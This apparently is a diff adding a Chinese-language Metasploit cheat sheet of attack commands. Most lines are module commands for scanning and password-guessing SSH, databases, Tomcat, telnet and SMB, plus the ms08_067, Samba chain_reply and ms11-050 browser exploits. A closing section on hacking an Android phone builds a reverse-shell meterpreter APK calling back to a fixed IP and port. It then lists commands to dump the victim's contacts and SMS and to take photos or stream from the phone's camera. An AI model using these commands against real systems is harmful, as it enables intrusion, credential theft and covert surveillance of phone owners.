@@ -1,0 +1,74 @@
+
+
+
+🔵 ssh
+use auxiliary/scanner/ssh/ssh_version
+
+ssh服务口令猜测
+use auxiliary/scanner/ssh/ssh_login
+
+
+
+
+
+
+🔵 oracle数据库服务扫描
+use auxiliary/scanner/oracle/tnslsnr_version
+
+
+
+
+
+🔵 mysql攻击
+use auxiliary/scanner/mysql/mysql_login
+
+
+
+🔵 postgresql攻击
+use auxiliary/scanner/postgres/postgres_login
+
+
+🔵 tomcat 攻击
+use auxiliary/scanner/http/tomcat_mgr_login
+
+
+
+
+🔵 telnet 攻击
+use auxiliary/scanner/telnet/telnet_version
+
+
+
+🔵 samba攻击
+use auxiliary/scanner/smb/smb_version
+
+search ms08_067
+use exploit/windows/smb/ms08_067_netapi
+
+SAMBA渗透攻击
+
+search chain_reply
+use exploit/linux/samba/chain_reply
+
+
+
+🔵 浏览器渗透攻击实例
+ms11-050
+use windows/browser/ms11_050_mshtml_cobjectelemnt
+
+
+
+
+
+🔵 入侵安卓手机
+
+msfpayload android/meterpreter/reverse_tcp LHOST=172.16.1.109 LPORT=4444 R > /root/Desktop/apk.apk
+use exploit/mutli/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 172.16.1.109
+exploit
+dump_contacts –这个是导出电话dump_sms –这个是导出信息
+Webcam_list可以看到有几个摄像头
+-i 1 是选择后摄像头
+webcam_snap 是拍照 ，看到我电脑了
+webcam_stream 开启摄像头
